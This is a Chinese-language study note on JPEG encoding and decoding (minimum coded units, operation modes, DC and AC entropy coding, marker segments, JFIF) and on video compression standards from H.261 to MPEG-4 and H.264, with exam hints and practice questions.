<p>上例中，B、C 在水平方向上与 A 相比少了一半样本。在这个例子中，A 的两个数据单元和 B、C 的各一个单元进行交织。</p>
<blockquote>
<p>[!hint] 考点 28：JPEG 编码与解码过程：最小编码单元、操作模式、DC 熵编码、AC 熵编码、游程、SIZE、EOB</p>
</blockquote>
<h2>最小编码单元 MCU</h2>
<p>在基于 DCT 的编解码器中，<strong>数据单元</strong>是一个 8x8 的样本块。</p>
<p><span style="color:#ff0000">最小编码单元 MCU</span>：最小的交错<strong>数据单元</strong>组。对于非交错数据，MCU 是一个数据单元。对于交错数据，MCU 是由扫描中组件的采样因子定义的数据单元序列。交错数据是 MCU 的有序序列，MCU 中包含的数据单元数由交错的元件数及其相对采样因子决定。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102202208.webp" alt="image.png"></p>
<p>当两个或更多的组件进行交织时，每一个组件 $C_i$ 被 $V_i$ 个数据单元划分为 $H_i$ 的矩形区域。<strong>最大的组件交织数为 4，且每个 MCU 的数据单元最大值为 10</strong>：$$\sum_{\text{所有参与交织的}~i}{H_i\times V_i}\le 10$$（注：置于 10 这个数字是规定的，没有理由）</p>
<h2>操作模式</h2>
<p>🔺有四种不同的操作模式，在这些模式下定义了各种编码过程：</p>
<ul>
<li>基于 DCT 的顺序模式（从上到下，一块一块编码）</li>
<li>基于 DCT 的渐进模式（从轮廓到细节）</li>
<li>无损模式</li>
<li>层次模式</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102202314.webp" alt="image.png"></p>
<h3>顺序模式与渐进模式</h3>
<p>在顺序模式中，每一个图片组件在单个扫描中编码。</p>
<p>在渐进模式中，每一个图片组件在多次扫描中编码。第一次扫描中编码粗糙，但可识别的图像版本可以快速传输，且通过后续的扫描进行改进，直到达到由量化表确定的图像质量水平。</p>
<p><span style="color:#ff0000">有两种互补的方法可以对量化 DCT 系数块进行部分编码</span>：</p>
<ol>
<li>在给定的扫描中，只有之字形序列特定的系数带需要进行编码</li>
<li>在给定的扫描中，无需将当前频带内的系数编码为完全（量化）精度。
<ol>
<li>最重要的 N 个比特可以在第一次扫描中编码</li>
<li>在随后的扫描中，次重要的比特再进行编码</li>
<li>这个过程叫做「连续逼近」</li>
</ol>
</li>
</ol>
<p>这两种程序可以单独使用，也可以灵活地混合使用。</p>
<p>量化 DCT 系数的传递：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102202328.webp" alt="image.png"></p>
<p>光谱选择与逐次逼近：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102202337.webp" alt="image.png"></p>
<h3>层次模式</h3>
<p>层次模式以多种分辨率的方式为图片提供金字塔型的编码。每一种的分辨率与其相邻的编码在水平或垂直维度或两者上相差两倍：</p>
<ol>
<li>对原始图像在每个维度上按所需的 2 的倍数进行滤波和下采样。</li>
<li>使用顺序 DCT、渐进式 DCT 或无损编码器之一对这个减小尺寸的图像进行编码。</li>
<li>解码此缩小尺寸的图像，然后使用接收器必须使用的相同插值滤波器对它进行水平和/或垂直 2 插值和上采样。</li>
<li>使用此上采样图像作为该分辨率下的原始图像的预测，并使用前面介绍的顺序 DCT，逐行 DCT 或无损编码器之一对差异图像进行编码。</li>
<li>重复第 3 步和第 4 步，直到图像的全分辨率被编码</li>
</ol>
<h2>基线顺序熵编码</h2>
<p>在基线顺序编码器中，FDCT、量化、DC 差分以及之字形排序步骤之后，是熵编码。</p>
<p>在熵编码之前，通常只有很少的非零系数和很多零值系数。熵编码的任务是更有效地编码这些系数。</p>
<p>基线顺序熵编码有两个步骤：</p>
<ol>
<li>将量化 DCT 系数转换为中间符号序列（游程编码）</li>
<li>为符号分配可变长度代码（哈夫曼编码）</li>
</ol>
<h3>AC 系数</h3>
<p>每一个非零的 AC 系数这样编码：</p>
<ul>
<li><code>RUN-LENGTH</code>：之字形扫描序列中，被表示的非零 AC 系数前，连续数字 0 的长度。
<ul>
<li><code>RUN-LENGTH</code> 代表 <span style="color:#ff0000">0~15</span>，Symbol-1 中 <code>(15, 0)</code> 代表 <code>RUN-LENGTH</code>=16。</li>
<li><code>(0,0)</code> 代表 <code>EOB</code>（块结束），可以将其视为“转义”符号。</li>
</ul>
</li>
<li><code>SIZE</code>：编码 <code>AMPLITUDE</code> 所用的比特数</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102202410.webp" alt="image.png"></p>
<blockquote>
<p>[!example] 更多例子<br>
0005 → (3,3)(5)<br>
000003 → (5,2)(3)<br>
00,-12 →  (2,4)(-12)<br>
0..(16 个 0)..0 1 → (15,0)(0,1)(1)<br>
0..(17 个 0)..0 1 → (15,0)(1,1)(1)<br>
0..(18 个 0)..0 -3 → (15,0)(2,2)(-3)<br>
00000 3 0..0 → (5,2)(3)(0,0)<br>
0013 →  (2,1)(1) (0,2)(3)</p>
</blockquote>
<h3>AMPLITUDE 和 SIZE 的范围</h3>
<p>量化 AC 系数的取值范围决定了 AMPLITUDE 和 SIZE 信息必须表示的值的范围。对 8×8 FDCT 方程的数值分析表明，如果 64 点 (8×8 块) 输入信号包含 N 位整数，则输出数字的非小数部分 (DCT 系数) 最多可以增长 3 位。这也是量化 DCT 系数的最大可能大小。</p>
<p>基线顺序在 $[-2^7,2^7-1]$ 范围内有 8 位整数源样本，因此量化的 AC 系数幅度由 $[-2^{10},2^{10}-1]$ 范围内的整数覆盖。</p>
<p>带符号整数编码使用长度为 1 到 10 位的 symbol-2 AMPLITUDE 码，因此 SIZE 也代表 1 到 10 的值。RUNLENGTH 表示从 0 到 15 的值。</p>
<h3>DC 系数</h3>
<p>8×8 样本块的差分 DC 系数的中间表示结构类似：</p>
<ul>
<li>Symbol-1 只表示 SIZE 信息</li>
<li>Symbol-2 表示振幅信息</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102202435.webp" alt="image.png"></p>
<p>因为 DC 系数是差分编码的，所以它覆盖的整数值 $[-2^{11},2^{11}-1]$ 是 AC 系数的两倍，因此必须为 DC 系数增加一个附加的电平。</p>
<p>因此，DC 系数大小的 symbol–1 表示从 0 到 11 的值。</p>
<blockquote>
<p><strong>差分编码</strong>（differential encoding）指的是对数字数据流，除第一个元素外，将其中各元素都表示为各该元素与其前一元素的差的编码。差分编码的简单例子是储存序列式资料之间的差异（而不是储存资料本身）：不存“2, 4, 6, 9, 7”，而是存“2, 2, 2, 3, -2”。</p>
</blockquote>
<h3>可变长度熵编码</h3>
<p>对于 DC 和 AC 系数，每个 symbol-1 均使用来自 Huffman 表集中的可变长度代码（VLC）进行编码。 每个 symbol-2 均使用“可变长度整数”（VLI）码进行编码。</p>
<p>VLCs 和 VLIs 是具有可变长度的代码，但 VLI 不是霍夫曼代码。一个重要的区别是，VLC（ Huffman code）的长度直到解码才知道，而 VLI 的长度存储在其前一个 VLC 中。</p>
<p>Huffman 码必须在外部指定为 JPEG 编码器的输入。</p>
<p>请注意，Huffman 表在数据流中的表示形式是一种间接规范，解码器在解压缩之前必须以此间接规范来构造表（解码时需要重新构建 Huffman 树进行解码）。 JPEG 标准包括一组 Huffman 表的示例，但这不是强制性的。</p>
<h3>基线编码例子</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102202510.webp" alt="image.png"></p>
<blockquote>
<p>[!hint] 考点 29：JPEG 交换格式（JIF）：图像、帧、扫描和标记</p>
</blockquote>
<h2>图像、帧和扫描的关系</h2>
<ul>
<li>压缩的图像数据只包含一张图片。</li>
<li><strong>在渐进模式和顺序模式编码过程中，一张图片只包含一帧。</strong></li>
<li><strong>在层次模式中，一张图片可以包含多帧。</strong></li>
<li>一帧可以包含一个或多个扫描。</li>
<li>顺序模式下，一个扫描包含一个完整的、单个/多个图像组件的编码。</li>
<li><span style="color:#ff0000">在层次模式中：当一张图像的三个组件非交织时，一帧包含三个扫描；如果三个组件交织一起，那么一帧包含一趟扫描。</span></li>
<li>一帧也可以包含两趟扫描：一趟是非交织的组件、另一趟为两组件交织。</li>
</ul>
<h2>标记</h2>
<p><strong>标记用于标识压缩数据格式的各种结构部分。</strong></p>
<p>所有的标记赋予两个字节编码：0xFF+ 不等于 0 或 0xFF 的字节。</p>
<p>标记段包含一个标记以及相关参数的序列。标记段的第一个参数是两字节长的参数，它指定了标记段的字节数（除去两字节标记后的参数长度）</p>
<p>被 SOF 和 SOS 标记码标识出的标记段被视为头（headers）：分别为帧报头和扫描报头。</p>
<p>SOI（0xFFD8）：压缩图片开始标记</p>
<p>EOI（0xFFD9）：压缩图片的结束标记</p>
<h3>高级语法</h3>
<p>基于顺序 DCT、渐进式 DCT 和无损操作模式的语法：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102202539.webp" alt="image.png"></p>
<h4>帧头语义</h4>
<p>帧报头应该出现在帧的开始。该报头指定源图像特征、帧中的组件和每个组件的采样因子，并指定从中检索要与每个组件一起使用的量化表的目标。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102202601.webp" alt="image.png"></p>
<table>
<thead>
<tr>
<th>标记结构</th>
<th>长度（字节）</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>0xFFC0</td>
<td>2</td>
<td>SOF marker</td>
</tr>
<tr>
<td>Lf</td>
<td>2</td>
<td>Frame header length, not including the first two bytes 0xFF, 0xC0</td>
</tr>
<tr>
<td>P</td>
<td>1</td>
<td>Sampling precision, equals 0x08 in a baseline system</td>
</tr>
<tr>
<td>Y</td>
<td>2</td>
<td>Image height</td>
</tr>
<tr>
<td>X</td>
<td>2</td>
<td>Image width</td>
</tr>
<tr>
<td>Nf</td>
<td>1</td>
<td>Number of components in a frame. 1 (grey scale) or 3 (color)</td>
</tr>
<tr>
<td>C1</td>
<td>1</td>
<td>Component 1</td>
</tr>
<tr>
<td>(H1,V1)</td>
<td>1</td>
<td>Horizontal and vertical sampling factor</td>
</tr>
<tr>
<td>Tq1</td>
<td>1</td>
<td>Quantization table</td>
</tr>
<tr>
<td>C2</td>
<td>1</td>
<td>Component 2</td>
</tr>
<tr>
<td>(H2,V2)</td>
<td>1</td>
<td>Horizontal and vertical sampling factor</td>
</tr>
<tr>
<td>Tq2</td>
<td>1</td>
<td>Quantization table</td>
</tr>
<tr>
<td>⋯</td>
<td>⋯</td>
<td>⋯</td>
</tr>
</tbody>
</table>
<h4>扫描头语义</h4>
<p>扫描头应在扫描开始时出现。这个报头指定扫描中包含哪些组件，指定从中检索要与每个组件一起使用的熵表的地址。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102202705.webp" alt="image.png"></p>
<table>
<thead>
<tr>
<th>标记</th>
<th>长度（字节）</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>0xFFDA</td>
<td>2</td>
<td>SOS marker</td>
</tr>
<tr>
<td>Ls</td>
<td>2</td>
<td>Scan header length, not including the first two bytes 0xFF, 0xDA</td>
</tr>
<tr>
<td>Ns</td>
<td>1</td>
<td>Number of components in a scan, in a baseline system, Ns=Nf (Number of components in a frame)</td>
</tr>
<tr>
<td>Cs1</td>
<td>1</td>
<td>Component number in a scan</td>
</tr>
<tr>
<td>(Td1,Ta1)</td>
<td>1</td>
<td>Tdn: the four most significant bits, used to select DC entropy coding table <br>Tan: the four least significant bits, used to select AC entropy coding table</td>
</tr>
<tr>
<td>⋯</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Ss</td>
<td>1</td>
<td>Default values are [00] [3F] [00] in a baseline system</td>
</tr>
<tr>
<td>Se</td>
<td>1</td>
<td>Default values are [00] [3F] [00] in a baseline system</td>
</tr>
<tr>
<td>(Ah,Al)</td>
<td>1</td>
<td>Default values are [00] [3F] [00] in a baseline system</td>
</tr>
</tbody>
</table>
<h4>DQT 标记段语义</h4>
<p>定义量化表 (DQT) 标记段，用于定义一个或多个量化表。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102202826.webp" alt="image.png"></p>
<table>
<thead>
<tr>
<th>标记</th>
<th>长度（字节）</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>0XFFDB</td>
<td>2</td>
<td>DQT marker</td>
</tr>
<tr>
<td>Lq</td>
<td>2</td>
<td>Quantization table length， not including 0XFF， 0XDB</td>
</tr>
<tr>
<td>(Pq,Tq)</td>
<td>1</td>
<td>Quantization table element precision <br>Pq=0, 8 bits for Q0~Qn, Pq=1, 16 bits for Qt; <br>Tq: Quantization table destination identifier</td>
</tr>
<tr>
<td>Q0</td>
<td>1 or 2</td>
<td>Quantization table element‐Specifies the kth element out of 64 elements</td>
</tr>
<tr>
<td>Q1</td>
<td>1 or 2</td>
<td>Quantization table element‐Specifies the kth element out of 64 elements</td>
</tr>
<tr>
<td>Qn</td>
<td>1 or 2</td>
<td>Quantization table element‐Specifies the kth element out of 64 elements</td>
</tr>
</tbody>
</table>
<h4>哈夫曼表规范语法</h4>
<p>哈夫曼表标记 (DHT) 段定义了一个或多个霍夫曼表规范。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102202912.webp" alt="image.png"></p>
<table>
<thead>
<tr>
<th>标记</th>
<th>长度（字节）</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td>0xFFC4</td>
<td>1</td>
<td>DHT marker</td>
</tr>
<tr>
<td>Ls</td>
<td>2</td>
<td>Huffman table definition length, not including 0xFF, 0xC4</td>
</tr>
<tr>
<td>(Tc,Th)</td>
<td>1</td>
<td>TC: Table class – 0 = DC table or lossless table, 1 = AC table. <br>Th:Huffman table destination identifier <br>Th Specifies one of four possible destinations at the decoder into which the Huffman table shall be installed.</td>
</tr>
<tr>
<td>L 1</td>
<td>1</td>
<td>Number of Huffman codes of length i</td>
</tr>
<tr>
<td>⋯</td>
<td>⋯</td>
<td></td>
</tr>
<tr>
<td>L 16</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>V 1</td>
<td>1</td>
<td>Value associated with each Huffman code, t=L1+L2+…L16</td>
</tr>
<tr>
<td>...</td>
<td>...</td>
<td></td>
</tr>
<tr>
<td>V t</td>
<td>1</td>
<td></td>
</tr>
</tbody>
</table>
<h2>JPEG 文件</h2>
<blockquote>
<p>[!hint] 考点 30：JPEG 文件交换格式（JFIF）</p>
</blockquote>
<p>到目前为止，我们描述的文件格式被称为「JPEG 交换格式 (JIF)」。然而，这种“纯粹”的文件格式很少使用，主要是因为，这个标准的某些缺点:</p>
<ul>
<li>色彩空间定义</li>
<li>组件子采样注册</li>
<li>像素宽高比定义</li>
</ul>
<p>JPEG 文件交换格式（JFIF）解决了 JIF 的局限性。JFIF 文件中的图像数据使用 JPEG 标准中的技术进行压缩，因此 JFIF 有时被称为“JPEG/JFIF”。</p>
<p>JPEG 文件交换格式是一种最小的文件格式，它使 JPEG 比特流能够在各种平台和应用程序之间进行交换。</p>
<p>此简化格式的唯一目的是允许交换 JPEG 压缩图像。</p>
<p>尽管 JPEG 文件交换格式 (JFIF) 的语法支持任何 JPEG 过程，但强烈建议将 JPEG 基线过程用于文件交换，这确保了与所有支持 JPEG 的应用程序的最大兼容性。</p>
<p><strong>JPEG 文件交换格式与标准的 JPEG 交换格式完全兼容。唯一的额外要求是必须在 SOI 标记之后出现 APP0 标记。</strong></p>
<p>JFIF 文件使用 APP0 标记段，并在帧头中限制某些参数，定义如下：</p>
<ul>
<li>长度、标识符、版本、单位、X 密度、Y 密度、X 缩略图、Y 缩略图、(RGB)n</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102203032.webp" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102203038.webp" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102203043.webp" alt="image.png"></p>
<h2>编码过程</h2>
<p>编码图像的流程</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102203054.webp" alt="image.png"></p>
<p>编码帧的流程</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102203101.webp" alt="image.png"></p>
<p>编码扫描的流程</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102203117.webp" alt="image.png"></p>
<p>编码重启间隔的流程</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102203125.webp" alt="image.png"></p>
<p>对最小编码单元进行编码的过程</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102203134.webp" alt="image.png"></p>
<p>使用哈夫曼编码 AC 系数的过程</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102203141.webp" alt="image.png"></p>
<p>非零 AC 系数的顺序编码过程</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102203149.webp" alt="image.png"></p>
<h2>解码过程</h2>
<p>解码压缩图像数据的过程</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102203157.webp" alt="image.png"></p>
<p>解码一帧的过程</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102203206.webp" alt="image.png"></p>
<p>解码扫描的过程：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102203212.webp" alt="image.png"></p>
<p>解码重启间隙的过程：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102203223.webp" alt="image.png"></p>
<p>解码 MCU 的过程：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102203230.webp" alt="image.png"></p>
<blockquote>
<p>[!example] 习题助记</p>
<ol>
<li>What are markers used for in JIF?<br>
标识压缩数据格式中不同的结构部分</li>
<li>Describe the full name of SOI,EOI,SOF,SOS<br>
Start of image marker,End of image marker,Start of Frame marker,Start of Scan marker</li>
<li>What is JPEG file interchange format used for?<br>
定义分辨率颜色等相关参数，为了能在不同应用和平台转换</li>
<li>An image contains ___ frame in the cases of sequential and progressive coding processes.<br>
one frame</li>
</ol>
</blockquote>
<h1>视频编码</h1>
<h2>视频编码标准的制定</h2>
<blockquote>
<p>[!hint] 考点 2：视频压缩标准及应用</p>
</blockquote>
<h3>ITU-T 国际电信联盟 - 电信</h3>
<h4>H.261</h4>
<ul>
<li>第一个视频压缩标准（1990 年）</li>
<li>专为综合业务数字网络（ISDN）视频会议设计的。</li>
<li>支持 352X288（CIF）和 176X144（QCIF）的分辨率色度分辨率子采样为 4：2：0</li>
<li>由于视频电话需要，在仅需较低的复杂性同时进行实时编码和解码。</li>
<li>由于它专注于对延迟敏感的双向视频，<span style="color:#ff0000">H.261 仅允许 I 和 P 帧，不允许 B 帧</span>。（B 帧需要等待后帧解码，存在时延）</li>
<li><strong>基于整数像素精度</strong>进行运动估计运算和搜索范围为 +/- 15 像素。</li>
<li>将基于 8x8 块的 DCT 应用于残差。然后在所有 AC 系数上进行<strong>固定</strong>的线性量化用<strong>固定</strong>的量化步长线性量化。</li>
<li>首先对量化系数进行游程编码，然后可变长度（霍夫曼）编码。</li>
<li>将简单的 2D FIR 滤波器应用于块边缘减少块效应。</li>
</ul>
<h4>H.263</h4>
<ul>
<li>用于公共交换电话网络（PSTN）可视电话</li>
<li>H.263（1996）是在 H.261 之后开发的，专注于更好<strong>更低比特率</strong>的视频质量。</li>
<li>通过普通电话调制解调器以 33.6 Kbps 的速度传输视频，是其重要的目标之一。</li>
<li>目标分辨率为 SQCIF（128x96）至 CIF（352X288）</li>
<li>与 H.261 类似，但运动矢量略有不同。其<strong>允许为½（“半像素”）的倍数</strong>。使用 16x16 宏块中的<strong>四个 8x8 像素块的四个运动矢量</strong>，而不是宏块的单个运动矢量。</li>
<li>PB 帧：P 帧和 B 帧（这是从当前编码的 P 帧和后一个先前编码的 P 帧预测而来的）编码为一个单元。</li>
<li>使用基于内容的算术编码模式代替霍夫曼编码，对于相同的图像质量，比特率略有降低。</li>
<li>H.263 通常在相同的比特率下实现大约 3 dB 的改善，或者在相同的 SNR（质量）下将比特率减少 50％。</li>
</ul>
<h4>H.264：Advanced video coding</h4>
<p>详看 🍂H.264-MPEG4-AVC（高级视频编码） 小节。</p>
<h3>ISO 国际标准化组织</h3>
<p>MPEG 成立于 1988 年，旨在开发在数字存储媒体上移动图片（视频）和关联的音频（光盘）的压缩标准。</p>
<h4>MPEG-1</h4>
<ul>
<li>ISO 制定的第一个视频压缩算法 (1991)</li>
<li>可在获得与 VHS 品质相似的视频和音频</li>
<li>比特率 1.5Mb/s</li>
<li>与典型的视频电话相比，支持电影内容中较重的运动（heavier motion）需要更多的计算资源</li>
<li>允许更长的延迟，允许 B 帧</li>
<li>使用自适应感知量化。单独的量化比例因子专门应用于每个频点以优化人类的视觉感知。</li>
</ul>
<h4>MPEG-2</h4>
<ul>
<li>是 MPEG-1 的扩展，支持更高的比特率，更高分辨率和<strong>隔行</strong>扫描图片（用于电视）。（先打奇数行再偶数行）</li>
<li>是为数字电视开发的比特率较高的应用：DTV，HDTV 和 DVD</li>
<li>由许多部分组成，包括视频，音频，系统，兼容性测试。</li>
<li>在 30：1 左右的压缩率下表现良好。 MPEG-2 以 4~8 Mbps 达到的质量对于消费者视频应用程序是可接受的。</li>
</ul>
<h5>MPEG-2 Profiles and Levels</h5>
<p>这些标准旨在解决大量不同的应用程序需要许多不同的工具或功能的问题。典型的应用程序可能仅使用 MPEG 功能的一小部分。 为了实现更有效的实现，MPEG 将功能的子集适当的组合在一起，并定义了一组配置文件和级别。</p>
<ul>
<li>档次（profile）定义了视频语法和功能的子集。</li>
<li>在档次（profile）中，级别定义了某些参数的最大范围，例如分辨率，帧速率，比特率和缓冲区大小（下限）。</li>
</ul>
<p>两个广泛使用的配置文件/级别是：</p>
<ul>
<li>Main Level at Main Profile (MP@ML)：用于压缩 DVD 上使用的常规电视（例如 NTSC 或 PAL）和标清数字电视（SD DTV）</li>
<li>Main Profile at High Level (MP@HL)：用于压缩高清电视（HDTV）（1080p）</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109211917.webp" alt="image.png"></p>
<h4>MPEG-4</h4>
<p>MPEG-4 与 MPEG-1 和 MPEG-2 完全不同，它的主要目标是提供新功能，而不仅仅是提供更好的压缩。将提供增强的功能：</p>
<ul>
<li>支持基于对象或基于内容的表示。这使得可以对视频场景中的不同视频对象进行单独编码，并且允许对视频中的不同对象进行单独访问和操作。请注意，MPEG-4 没有指定如何识别或分割视频中的对象。但是，如果单个对象已知，MPEG-4 提供了一种压缩这些对象的方法。</li>
<li>支持对合成或计算机生成的视频对象进行压缩，以及在单个视频中集成自然对象和合成对象。此外，MPEG-4 支持通过差错恢复（例如 Internet 和 3G 无线系统）进行防错通信。因此，MPEG-4 同时支持基于对象和基于帧的视频编码。</li>
<li>与场景的交互</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109213856.webp" alt="image.png|475"></p>
<p>Demuxer 用于解析和解码视频和音频对象。场景描述信息描述了解码对象如何组成和渲染以形成最终场景。</p>
<p>与 MPEG-2 和 MPEG-4 简单档次相比，H.264 / AVC 在压缩效率方面取得了重大突破，通常可实现约 2 倍的压缩。</p>
<p>为了满足从低质量，低分辨率监视摄像机到高清电视广播和 DVD 的各种应用，MPEG-4 第 2 部分定义了大约 21 个档次（profiles）：Simple, Advanced Simple, Main, Core, Advanced Coding Efficiency, Advanced Real Time Simple 等。最常用的档次是 Advanced Simple 和 Simple（都是 Advanced Simple 的子集）。</p>
<h3>当前视频压缩标准</h3>
<table>
<thead>
<tr>
<th>年份</th>
<th>标准</th>
<th>发布机构</th>
<th>🔺常用于</th>
</tr>
</thead>
<tbody>
<tr>
<td>1990</td>
<td>H.261</td>
<td>ITU-T</td>
<td>ISDN 上的视频会议, 可视电话</td>
</tr>
<tr>
<td>1993</td>
<td>MPEG-1 part 2</td>
<td>ISO, IEC</td>
<td>Video-CD 数字存储媒介（CD-ROM）上的视频</td>
</tr>
<tr>
<td>1995</td>
<td>H.262/MPEG-2 Part 2</td>
<td>ISO, IEC, ITU-T</td>
<td>DVD Video, Blu-ray, Digital Video Broadcasting, 数字电视</td>
</tr>
<tr>
<td>1996</td>
<td>H.263</td>
<td>ITU-T</td>
<td>视频会议, PSTN 上的可视电话, Video on Mobile Phones (3GP)</td>
</tr>
<tr>
<td>1999</td>
<td>MPEG-4 Part 2</td>
<td>ISO, IEC</td>
<td>Video on Internet (DivX, Xvid ...), 基于对象的编码, 合成内容, 集成</td>
</tr>
<tr>
<td>2003</td>
<td>H.264/MPEG-4 AVC</td>
<td>Sony, Panosonic, Samsung, ISO, IEC, ITU-T</td>
<td>Blu-ray,HD DVD Digital Video Broadcasting, 无线, 因特网, 电影, 视频电话, 视频会议</td>
</tr>
</tbody>
</table>
<h2>标准化的范围</h2>
<blockquote>
<p>[!hint] 考点 31：视频编码和解码架构：normative, informative</p>
</blockquote>
<p>视频压缩系统由一个编码器，压缩比特流和解码器组成。</p>
<p>标准限定的范围有限，是为了在确保互操作性同时尽可能实现差异化：</p>
<ul>
<li><span style="color:#ff0000">标准指定比特流语法和解码过程</span></li>
<li>标准不限定编码过程或具体解码器的实现。</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109202142.webp" alt="image.png"></p>
<blockquote>
<p>[!hint] 考点 32：MPEG 编码结构、MPEG 语法</p>
</blockquote>
<h2>MPEG 编码结构</h2>
<p>MPEG 以单元层次结构编码视频，这些单元称为<strong>序列、图像组 (GOPs)、图像、切片、宏块和 DCT 块</strong>：</p>
<ul>
<li>对 16x16 像素的宏块执行 MC 预测（运动补偿预测）</li>
<li>这些宏块组成一个切片</li>
<li>一帧中的所有切片均包含一张图片，连续的图片形成一个 GOP。</li>
<li>所有 GOP 形成一个序列。</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109203121.webp" alt="image.png"></p>
<h3>GOP</h3>
<p>视频帧被分组为编码单元，称为图像组 (GOPs)。</p>
<p>GOPs 具有重新初始化编码中使用的时间预测的属性。</p>
<p><strong>GOP 的第一帧总是以帧内模式编码，称为 I 帧</strong></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231109203351.webp" alt="image.png|525"></p>
<p>用 I 帧通过正向预测或双向预测得到 P 帧或 B 帧。</p>
<p>GOP 长度通常在 9 到 15 帧之间。</p>
<p><strong>每个 B 帧都取决于过去帧和一个将来帧，这意味着将来帧必须是在当前 B 帧可以被解/编码之前被解/编码。</strong></p>
<p><strong>编码后的视频数据以编码顺序放置在数据流中，而不是显示顺序</strong>。</p>
<h3>I P B 帧编码属性</h3>
<p>I，P 和 B 帧的编码通常需要不同数据量。</p>
<ul>
<li>I 帧需要大量数据，因为它们的编码与其他框架无关。</li>
<li><span style="color:#ff0000">P 和 B 帧通常需要的数据少于 I 帧（时间预测）</span>。</li>
<li>B 帧的编码数据通常少于 P 帧，因为：
<ul>
<li>同时使用前后参考帧，可以形成更好的预测。</li>
<li>以较低的质量编码 B 帧通常不会带来负面影响，B 帧的编码质量较低不会影响序列中的其他帧。</li>
</ul>
</li>
</ul>
<h3>宏块</h3>
<p>MPEG 使用 16x16 像素 MC 预测来减少时间视频中固有的冗余。</p>
<p>在 I 帧中，必须以帧内模式对每个宏块进行编码。</p>
<p>在 P 帧中，每个宏块都可以使用前向编码预测或帧内模式。</p>
<p>在 B 帧中，每个宏块都可以前向编码，后向或双向预测或帧内模式。</p>
<p>为每个前向和后向预测指定一个 MV（motion vector）宏块，同时为每个双向指定两个 MV 预测宏块。</p>
<h3>DCT 块</h3>
<p>每个宏块（intra or inter）被划分为 8x8 像素块。</p>
<p>为每个块计算 2D-DCT。 DCT 系数被单独量化。</p>
<p>量化系数经过 zigzag 扫描，游程长度进行编码，结果对（游程长度，幅度组成的一对）经过霍夫曼编码并输出至比特流。</p>
<p>还有一些块间和宏块间处理。</p>
<h3>Slices</h3>
<p>MPEG 编码要求每个宏块都属于一个切片，所有切片都构成整个图片。</p>
<p><span style="color:#ff0000">切片是一系列任意数量的连续宏块：</span></p>
<ul>
<li><span style="color:#ff0000">每个切片至少应包含一个宏块。</span></li>
<li><span style="color:#ff0000">切片不得重叠。</span></li>
<li><span style="color:#ff0000">切片的位置可能因图片而异。</span></li>
</ul>
<p>这提供了一种用于预测宏块中某些参数的结构，同时保持一定程度的错误弹性。</p>
<p>在 I 帧中，DCT 系数的 DC 值在一个<strong>片（Slice）内</strong>从块到块被差分编码。（JPEG 是整幅图做差分编码）</p>
<p>在 P 和 B 帧中，运动矢量在片内从宏块到宏块进行差分编码。</p>
<p>如果位流中发生错误，则切片中的剩余数据将丢失。 但是，解码器可以通过搜索下一个切片起始码，重新同步位流并继续解码过程来恢复。</p>
<h3>MPEG Syntax</h3>
<p><strong>序列头</strong>指定图片的高度/宽度，以及样本宽高比，帧速率，比特率和缓冲区大小序列。 如果未使用默认的量化器，则还包括量化矩阵。</p>
<p><strong>GOP 头</strong>指定时间代码并指示 GOP 是否打开或关闭。</p>
<p><strong>图像头</strong>指定<strong>时间参考参数</strong>，图片类型（I，P 或 B）以及缓冲区充满度。 如果是使用时域预测，它还描述了运动矢量精度（完整或半像素）和运动矢量范围。</p>
<p><strong>切片头</strong>指定了切片开始的宏块行，以及 DCT 系数的初始量化器比例因子。</p>
<p><strong>宏块头</strong>包含一个标志，<strong>指示是内部还是帧间编码</strong>。</p>
<p>对于帧间编码，它包含编码的运动矢量，这个运动矢量会基于相对于先前的运动矢量进行差分编码。</p>
<p>可以在宏块级别上调整量化器比例因子。1bit 用于指定是否调整因子。</p>
<p>序列、GOP、图片、切片的标头以这些代码开头：</p>
<ul>
<li>例如，通过简单地检查编码数据流而无需解析或解码数据，就能找到第二个 GOP 中第二张图片的第二切片编码的数据</li>
<li>允许对压缩比特流的随机访问</li>
<li>提高容错能力</li>
</ul>
<blockquote>
<p>[!Example] 习题助记<br>
MPEG-1 is used in <strong>VCD</strong> ，MPEG-2 is used in <strong>DVD</strong>.<br>
MP3 is a lossy compression method.<br>
H.261、H.263 主要用于可视电话<br>
The bit stream synatax is specified in MPEG video coding standard.<br>
